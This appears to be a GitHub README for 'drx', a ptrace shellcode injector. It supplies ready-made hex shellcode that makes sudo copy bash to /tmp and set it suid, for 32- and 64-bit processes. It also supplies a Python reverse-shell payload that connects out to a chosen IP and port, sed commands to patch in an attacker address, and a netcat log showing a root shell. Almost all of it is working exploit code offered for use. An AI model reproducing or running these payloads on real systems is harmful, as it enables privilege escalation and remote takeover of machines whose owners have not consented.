# drx_ptrace_shellcode_injector
drx ptrace shellcode injector

## How to compile

```
gcc -o drx drx.c
```

## How to use

You can inject some shellcodes:

### Default builtin hello world shellcode

./drx PID

```
./drx 4940
```

### bash suid local privilege escalation via ptrace misconfiguration

Based from: https://github.com/David-Reguera-Garcia-Dreg/ptrace_misconfiguration_local_privilege_escalation

Execute: /bin/sh -c "/bin/echo | /usr/bin/sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | /usr/bin/sudo -S /usr/bin/chmod +s /tmp/bash >/dev/null 2>&1`"

For a 32 bit process:
```
./drx PID "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb8\x02\x00\x00\x00\xcd\x80\x83\xf8\x00\x74\x2e\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x89\xc3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xbe\x00\x00\x00\x00\xbf\x00\x00\x00\x00\xb8\x72\x00\x00\x00\xcd\x80\xe9\xbd\x00\x00\x00\x6a\x00\xe8\x86\x00\x00\x00\x2f\x62\x69\x6e\x2f\x65\x63\x68\x6f\x20\x7c\x20\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x73\x75\x64\x6f\x20\x2d\x53\x20\x63\x70\x20\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2f\x74\x6d\x70\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x7c\x20\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x73\x75\x64\x6f\x20\x2d\x53\x20\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x63\x68\x6d\x6f\x64\x20\x2b\x73\x20\x2f\x74\x6d\x70\x2f\x62\x61\x73\x68\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x00\xe8\x03\x00\x00\x00\x2d\x63\x00\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x8d\x0c\x24\x8b\x1c\x24\x31\xd2\xb8\x0b\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
```

For a 64 bit process:
```
./drx PID "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb8\x39\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x74\x25\x48\x89\xc7\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x41\xba\x00\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xb8\x3d\x00\x00\x00\x0f\x05\xe9\xc5\x00\x00\x00\x6a\x00\xe8\x86\x00\x00\x00\x2f\x62\x69\x6e\x2f\x65\x63\x68\x6f\x20\x7c\x20\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x73\x75\x64\x6f\x20\x2d\x53\x20\x63\x70\x20\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2f\x74\x6d\x70\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x7c\x20\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x73\x75\x64\x6f\x20\x2d\x53\x20\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x63\x68\x6d\x6f\x64\x20\x2b\x73\x20\x2f\x74\x6d\x70\x2f\x62\x61\x73\x68\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x00\xe8\x03\x00\x00\x00\x2d\x63\x00\x48\x8d\x05\x21\x00\x00\x00\x50\x48\x31\xd2\x48\x89\xe6\x48\x8d\x3d\x13\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
```

### python reverse shell detached background: local privilege escalation via ptrace misconfiguration

https://github.com/David-Reguera-Garcia-Dreg/python_reverse_shell_detached_background/

Steps for **64 bit process**:

Generate IP str, for ex 51.195.45.136 (SPACES between numbers)
```
export IP_ADDR=51.195.45.136
xxd -p <<< `printf '%02X' ${IP_ADDR//./ }`  | sed 's/.$//' | sed 's/.$//' | sed 's/\(..\)/\\\\x&/g; s/, $//;'
```
result: \\x33\\x33\\x43\\x33\\x32\\x44\\x38\\x38

Generate PORT str, for ex 6868
```
xxd -p <<< 6868 | sed 's/.$//' | sed 's/.$//' | sed 's/\(..\)/\\\\x&/g; s/, $//;'
```
result: \\x36\\x38\\x36\\x38

Replace in this command the **IP_HEX** and **PORT_HEX** with the PORT STR & IP STR output:

echo -n "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xb8\\x39\\x00\\x00\\x00\\x0f\\x05\\x48\\x83\\xf8\\x00\\x74\\x25\\x48\\x89\\xc7\\xbe\\x00\\x00\\x00\\x00\\xba\\x00\\x00\\x00\\x00\\x41\\xba\\x00\\x00\\x00\\x00\\x41\\xb8\\x00\\x00\\x00\\x00\\xb8\\x3d\\x00\\x00\\x00\\x0f\\x05\\xe9\\x5f\\x02\\x00\\x00\\x6a\\x00\\xe8\\x0d\\x02\\x00\\x00\\x65\\x78\\x65\\x63\\x28\\x22\\x22\\x22\\x0a\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x73\\x6f\\x63\\x6b\\x65\\x74\\x2c\\x73\\x75\\x62\\x70\\x72\\x6f\\x63\\x65\\x73\\x73\\x2c\\x6f\\x73\\x2c\\x73\\x79\\x73\\x0a\\x0a\\x70\\x69\\x64\\x72\\x67\\x20\\x3d\\x20\\x6f\\x73\\x2e\\x66\\x6f\\x72\\x6b\\x28\\x29\\x0a\\x69\\x66\\x20\\x70\\x69\\x64\\x72\\x67\\x20\\x3e\\x20\\x30\\x3a\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x73\\x79\\x73\\x2e\\x65\\x78\\x69\\x74\\x28\\x30\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x63\\x68\\x64\\x69\\x72\\x28\\x22\\x2f\\x22\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x73\\x65\\x74\\x73\\x69\\x64\\x28\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x75\\x6d\\x61\\x73\\x6b\\x28\\x30\\x29\\x0a\\x0a\\x64\\x72\\x67\\x70\\x69\\x64\\x20\\x3d\\x20\\x6f\\x73\\x2e\\x66\\x6f\\x72\\x6b\\x28\\x29\\x0a\\x69\\x66\\x20\\x64\\x72\\x67\\x70\\x69\\x64\\x20\\x3e\\x20\\x30\\x3a\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x73\\x79\\x73\\x2e\\x65\\x78\\x69\\x74\\x28\\x30\\x29\\x0a\\x0a\\x73\\x79\\x73\\x2e\\x73\\x74\\x64\\x6f\\x75\\x74\\x2e\\x66\\x6c\\x75\\x73\\x68\\x28\\x29\\x0a\\x0a\\x73\\x79\\x73\\x2e\\x73\\x74\\x64\\x65\\x72\\x72\\x2e\\x66\\x6c\\x75\\x73\\x68\\x28\\x29\\x0a\\x0a\\x66\\x64\\x72\\x65\\x67\\x20\\x3d\\x20\\x6f\\x70\\x65\\x6e\\x28\\x22\\x2f\\x64\\x65\\x76\\x2f\\x6e\\x75\\x6c\\x6c\\x22\\x2c\\x20\\x22\\x77\\x22\\x29\\x0a\\x0a\\x73\\x79\\x73\\x2e\\x73\\x74\\x64\\x6f\\x75\\x74\\x20\\x3d\\x20\\x66\\x64\\x72\\x65\\x67\\x0a\\x0a\\x73\\x79\\x73\\x2e\\x73\\x74\\x64\\x65\\x72\\x72\\x20\\x3d\\x20\\x66\\x64\\x72\\x65\\x67\\x0a\\x0a\\x73\\x64\\x72\\x65\\x67\\x73\\x3d\\x73\\x6f\\x63\\x6b\\x65\\x74\\x2e\\x73\\x6f\\x63\\x6b\\x65\\x74\\x28\\x73\\x6f\\x63\\x6b\\x65\\x74\\x2e\\x41\\x46\\x5f\\x49\\x4e\\x45\\x54\\x2c\\x73\\x6f\\x63\\x6b\\x65\\x74\\x2e\\x53\\x4f\\x43\\x4b\\x5f\\x53\\x54\\x52\\x45\\x41\\x4d\\x29\\x0a\\x0a\\x73\\x64\\x72\\x65\\x67\\x73\\x2e\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x28\\x28\\x73\\x74\\x72\\x28\\x30\\x78\\x37\\x66\\x30\\x30\\x30\\x30\\x30\\x31\\x29\\x2c\\x39\\x39\\x39\\x39\\x29\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x64\\x75\\x70\\x32\\x28\\x73\\x64\\x72\\x65\\x67\\x73\\x2e\\x66\\x69\\x6c\\x65\\x6e\\x6f\\x28\\x29\\x2c\\x30\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x64\\x75\\x70\\x32\\x28\\x73\\x64\\x72\\x65\\x67\\x73\\x2e\\x66\\x69\\x6c\\x65\\x6e\\x6f\\x28\\x29\\x2c\\x31\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x64\\x75\\x70\\x32\\x28\\x73\\x64\\x72\\x65\\x67\\x73\\x2e\\x66\\x69\\x6c\\x65\\x6e\\x6f\\x28\\x29\\x2c\\x32\\x29\\x0a\\x0a\\x70\\x3d\\x73\\x75\\x62\\x70\\x72\\x6f\\x63\\x65\\x73\\x73\\x2e\\x63\\x61\\x6c\\x6c\\x28\\x5b\\x22\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x22\\x2c\\x22\\x2d\\x69\\x22\\x5d\\x29\\x0a\\x22\\x22\\x22\\x29\\x00\\xe8\\x03\\x00\\x00\\x00\\x2d\\x63\\x00\\xe8\\x0c\\x00\\x00\\x00\\x2f\\x62\\x69\\x6e\\x2f\\x70\\x79\\x74\\x68\\x6f\\x6e\\x00\\x48\\x8d\\x05\\x21\\x00\\x00\\x00\\x50\\x48\\x31\\xd2\\x48\\x89\\xe6\\x48\\x8d\\x3d\\x13\\x00\\x00\\x00\\xb8\\x3b\\x00\\x00\\x00\\x0f\\x05\\xb8\\x3c\\x00\\x00\\x00\\xbb\\x00\\x00\\x00\\x00\\x0f\\x05\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x75\\x64\\x6f\\x00\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90" | sed 's/\\x39\\x39\\x39\\x39/**PORT_HEX**/g' | sed 's/\\x37\\x66\\x30\\x30\\x30\\x30\\x30\\x31/**IP_HEX**/g'

Example of command:

```
echo -n "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xb8\\x39\\x00\\x00\\x00\\x0f\\x05\\x48\\x83\\xf8\\x00\\x74\\x25\\x48\\x89\\xc7\\xbe\\x00\\x00\\x00\\x00\\xba\\x00\\x00\\x00\\x00\\x41\\xba\\x00\\x00\\x00\\x00\\x41\\xb8\\x00\\x00\\x00\\x00\\xb8\\x3d\\x00\\x00\\x00\\x0f\\x05\\xe9\\x5f\\x02\\x00\\x00\\x6a\\x00\\xe8\\x0d\\x02\\x00\\x00\\x65\\x78\\x65\\x63\\x28\\x22\\x22\\x22\\x0a\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x73\\x6f\\x63\\x6b\\x65\\x74\\x2c\\x73\\x75\\x62\\x70\\x72\\x6f\\x63\\x65\\x73\\x73\\x2c\\x6f\\x73\\x2c\\x73\\x79\\x73\\x0a\\x0a\\x70\\x69\\x64\\x72\\x67\\x20\\x3d\\x20\\x6f\\x73\\x2e\\x66\\x6f\\x72\\x6b\\x28\\x29\\x0a\\x69\\x66\\x20\\x70\\x69\\x64\\x72\\x67\\x20\\x3e\\x20\\x30\\x3a\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x73\\x79\\x73\\x2e\\x65\\x78\\x69\\x74\\x28\\x30\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x63\\x68\\x64\\x69\\x72\\x28\\x22\\x2f\\x22\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x73\\x65\\x74\\x73\\x69\\x64\\x28\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x75\\x6d\\x61\\x73\\x6b\\x28\\x30\\x29\\x0a\\x0a\\x64\\x72\\x67\\x70\\x69\\x64\\x20\\x3d\\x20\\x6f\\x73\\x2e\\x66\\x6f\\x72\\x6b\\x28\\x29\\x0a\\x69\\x66\\x20\\x64\\x72\\x67\\x70\\x69\\x64\\x20\\x3e\\x20\\x30\\x3a\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x73\\x79\\x73\\x2e\\x65\\x78\\x69\\x74\\x28\\x30\\x29\\x0a\\x0a\\x73\\x79\\x73\\x2e\\x73\\x74\\x64\\x6f\\x75\\x74\\x2e\\x66\\x6c\\x75\\x73\\x68\\x28\\x29\\x0a\\x0a\\x73\\x79\\x73\\x2e\\x73\\x74\\x64\\x65\\x72\\x72\\x2e\\x66\\x6c\\x75\\x73\\x68\\x28\\x29\\x0a\\x0a\\x66\\x64\\x72\\x65\\x67\\x20\\x3d\\x20\\x6f\\x70\\x65\\x6e\\x28\\x22\\x2f\\x64\\x65\\x76\\x2f\\x6e\\x75\\x6c\\x6c\\x22\\x2c\\x20\\x22\\x77\\x22\\x29\\x0a\\x0a\\x73\\x79\\x73\\x2e\\x73\\x74\\x64\\x6f\\x75\\x74\\x20\\x3d\\x20\\x66\\x64\\x72\\x65\\x67\\x0a\\x0a\\x73\\x79\\x73\\x2e\\x73\\x74\\x64\\x65\\x72\\x72\\x20\\x3d\\x20\\x66\\x64\\x72\\x65\\x67\\x0a\\x0a\\x73\\x64\\x72\\x65\\x67\\x73\\x3d\\x73\\x6f\\x63\\x6b\\x65\\x74\\x2e\\x73\\x6f\\x63\\x6b\\x65\\x74\\x28\\x73\\x6f\\x63\\x6b\\x65\\x74\\x2e\\x41\\x46\\x5f\\x49\\x4e\\x45\\x54\\x2c\\x73\\x6f\\x63\\x6b\\x65\\x74\\x2e\\x53\\x4f\\x43\\x4b\\x5f\\x53\\x54\\x52\\x45\\x41\\x4d\\x29\\x0a\\x0a\\x73\\x64\\x72\\x65\\x67\\x73\\x2e\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x28\\x28\\x73\\x74\\x72\\x28\\x30\\x78\\x37\\x66\\x30\\x30\\x30\\x30\\x30\\x31\\x29\\x2c\\x39\\x39\\x39\\x39\\x29\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x64\\x75\\x70\\x32\\x28\\x73\\x64\\x72\\x65\\x67\\x73\\x2e\\x66\\x69\\x6c\\x65\\x6e\\x6f\\x28\\x29\\x2c\\x30\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x64\\x75\\x70\\x32\\x28\\x73\\x64\\x72\\x65\\x67\\x73\\x2e\\x66\\x69\\x6c\\x65\\x6e\\x6f\\x28\\x29\\x2c\\x31\\x29\\x0a\\x0a\\x6f\\x73\\x2e\\x64\\x75\\x70\\x32\\x28\\x73\\x64\\x72\\x65\\x67\\x73\\x2e\\x66\\x69\\x6c\\x65\\x6e\\x6f\\x28\\x29\\x2c\\x32\\x29\\x0a\\x0a\\x70\\x3d\\x73\\x75\\x62\\x70\\x72\\x6f\\x63\\x65\\x73\\x73\\x2e\\x63\\x61\\x6c\\x6c\\x28\\x5b\\x22\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x22\\x2c\\x22\\x2d\\x69\\x22\\x5d\\x29\\x0a\\x22\\x22\\x22\\x29\\x00\\xe8\\x03\\x00\\x00\\x00\\x2d\\x63\\x00\\xe8\\x0c\\x00\\x00\\x00\\x2f\\x62\\x69\\x6e\\x2f\\x70\\x79\\x74\\x68\\x6f\\x6e\\x00\\x48\\x8d\\x05\\x21\\x00\\x00\\x00\\x50\\x48\\x31\\xd2\\x48\\x89\\xe6\\x48\\x8d\\x3d\\x13\\x00\\x00\\x00\\xb8\\x3b\\x00\\x00\\x00\\x0f\\x05\\xb8\\x3c\\x00\\x00\\x00\\xbb\\x00\\x00\\x00\\x00\\x0f\\x05\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x75\\x64\\x6f\\x00\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90" | sed 's/\\x39\\x39\\x39\\x39/\\x36\\x38\\x36\\x38/g' | sed 's/\\x37\\x66\\x30\\x30\\x30\\x30\\x30\\x31/\\x33\\x33\\x43\\x33\\x32\\x44\\x38\\x38/g'
```

The output is the generated shellcode, now execute drx with target PID and the shellcode generated, ex with 6978 PID:

```
./drx 6978 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb8\x39\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x74\x25\x48\x89\xc7\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x41\xba\x00\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xb8\x3d\x00\x00\x00\x0f\x05\xe9\x5f\x02\x00\x00\x6a\x00\xe8\x0d\x02\x00\x00\x65\x78\x65\x63\x28\x22\x22\x22\x0a\x69\x6d\x70\x6f\x72\x74\x20\x73\x6f\x63\x6b\x65\x74\x2c\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2c\x6f\x73\x2c\x73\x79\x73\x0a\x0a\x70\x69\x64\x72\x67\x20\x3d\x20\x6f\x73\x2e\x66\x6f\x72\x6b\x28\x29\x0a\x69\x66\x20\x70\x69\x64\x72\x67\x20\x3e\x20\x30\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x79\x73\x2e\x65\x78\x69\x74\x28\x30\x29\x0a\x0a\x6f\x73\x2e\x63\x68\x64\x69\x72\x28\x22\x2f\x22\x29\x0a\x0a\x6f\x73\x2e\x73\x65\x74\x73\x69\x64\x28\x29\x0a\x0a\x6f\x73\x2e\x75\x6d\x61\x73\x6b\x28\x30\x29\x0a\x0a\x64\x72\x67\x70\x69\x64\x20\x3d\x20\x6f\x73\x2e\x66\x6f\x72\x6b\x28\x29\x0a\x69\x66\x20\x64\x72\x67\x70\x69\x64\x20\x3e\x20\x30\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x79\x73\x2e\x65\x78\x69\x74\x28\x30\x29\x0a\x0a\x73\x79\x73\x2e\x73\x74\x64\x6f\x75\x74\x2e\x66\x6c\x75\x73\x68\x28\x29\x0a\x0a\x73\x79\x73\x2e\x73\x74\x64\x65\x72\x72\x2e\x66\x6c\x75\x73\x68\x28\x29\x0a\x0a\x66\x64\x72\x65\x67\x20\x3d\x20\x6f\x70\x65\x6e\x28\x22\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x22\x2c\x20\x22\x77\x22\x29\x0a\x0a\x73\x79\x73\x2e\x73\x74\x64\x6f\x75\x74\x20\x3d\x20\x66\x64\x72\x65\x67\x0a\x0a\x73\x79\x73\x2e\x73\x74\x64\x65\x72\x72\x20\x3d\x20\x66\x64\x72\x65\x67\x0a\x0a\x73\x64\x72\x65\x67\x73\x3d\x73\x6f\x63\x6b\x65\x74\x2e\x73\x6f\x63\x6b\x65\x74\x28\x73\x6f\x63\x6b\x65\x74\x2e\x41\x46\x5f\x49\x4e\x45\x54\x2c\x73\x6f\x63\x6b\x65\x74\x2e\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x29\x0a\x0a\x73\x64\x72\x65\x67\x73\x2e\x63\x6f\x6e\x6e\x65\x63\x74\x28\x28\x73\x74\x72\x28\x30\x78\x33\x33\x43\x33\x32\x44\x38\x38\x29\x2c\x36\x38\x36\x38\x29\x29\x0a\x0a\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x64\x72\x65\x67\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x30\x29\x0a\x0a\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x64\x72\x65\x67\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x31\x29\x0a\x0a\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x64\x72\x65\x67\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x32\x29\x0a\x0a\x70\x3d\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x63\x61\x6c\x6c\x28\x5b\x22\x2f\x62\x69\x6e\x2f\x73\x68\x22\x2c\x22\x2d\x69\x22\x5d\x29\x0a\x22\x22\x22\x29\x00\xe8\x03\x00\x00\x00\x2d\x63\x00\xe8\x0c\x00\x00\x00\x2f\x62\x69\x6e\x2f\x70\x79\x74\x68\x6f\x6e\x00\x48\x8d\x05\x21\x00\x00\x00\x50\x48\x31\xd2\x48\x89\xe6\x48\x8d\x3d\x13\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbb\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x75\x64\x6f\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
```

And done, you get a root shell from a sudo shell user

```
dreg@51.195.45.136:~# nc -lvp 6868
listening on [any] 6868 ...
connect to [51.195.45.136] from fr33project.org [51.195.45.136] 38672
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
#
```



